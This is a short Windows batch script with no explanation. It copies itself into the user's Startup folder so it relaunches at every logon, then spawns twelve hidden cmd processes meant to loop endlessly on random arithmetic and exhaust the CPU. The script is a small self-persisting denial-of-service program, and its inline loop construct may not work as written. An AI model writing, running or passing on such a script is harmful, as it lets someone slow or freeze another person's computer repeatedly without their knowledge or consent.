@echo off

set STARTUP=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup

copy "%~f0" "%STARTUP%"

for /L %%i in (1,1,12) do start /B "" cmd /c "set /a x=0 & :loop & set /a x=%random% * %random% >nul & goto loop"
